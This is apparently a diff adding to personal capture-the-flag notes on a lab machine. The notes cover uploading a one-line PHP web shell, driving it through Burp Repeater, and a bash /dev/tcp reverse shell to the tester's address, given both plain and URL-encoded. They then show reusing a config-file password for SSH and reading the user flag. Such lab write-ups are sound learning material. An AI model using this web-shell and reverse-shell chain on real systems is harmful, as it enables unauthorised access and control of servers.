@@ -437,8 +437,83 @@ $password = "thisisagoodpassword";
 ```
 
 Really?
+- That only got me logged into the website again (at the upload page).
+- Didn't work on ssh and didn't with with `su -`
+
+Walk-Through
+1. Create webshell.php with content: `<?php echo system($_REQUEST['cmd']);?>`
+2. Upload that. Run it. You get a blank page.
+3. In the URL append: `?cmd=id`. You should get a return when PHP executes that command.
+- This got me basically the same thing as the reverse shell: `uid=33(www-data)`
+
+Catch the ?cmd in Burp and send it to Repeater: 
+- Right-click and "Change request method" to POST
+```
+POST /_uploaded/webshell.php HTTP/1.1
+Host: 10.129.95.184
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: PHPSESSID=3l6ho9a5isro6f2ci8on3l1g11
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+
+cmd=id
+```
+
+Change that last line to: 
+```
+cmd=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
+# which would be:
+cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.155/1234 0>&1'
+```
+
+In order to execute our payload, we will have to first URL encode it.
+- Highlight the code (everything after `cmd-=`) and hit CTRL+U.
+- You end up with:
+```
+cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.155/1234+0>%261'
+```
+
+Okay. Got the same reverse shell as I did with Monkey's php file. 
+
+Walk-Through: System administrators often re-use passwords between web and system accounts so that they do not forget them.
+- He used the password from the config.php file to ssh into the system as john
+- That got me in as john
+
+```
+$ ssh john@10.129.95.184
+john@10.129.95.184's password: 
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-151-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Aug 25 01:12:32 UTC 2024
+
+  System load:  0.08              Processes:             111
+  Usage of /:   62.6% of 2.83GB   Users logged in:       0
+  Memory usage: 8%                IP address for ens160: 10.129.95.184
+  Swap usage:   0%
 
 
+10 updates can be applied immediately.
+8 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+john@base:~$ ls
+user.txt
+john@base:~$ cat user.txt 
+f54846c258f3b4612f78a819573d158e
+```
 
 
 
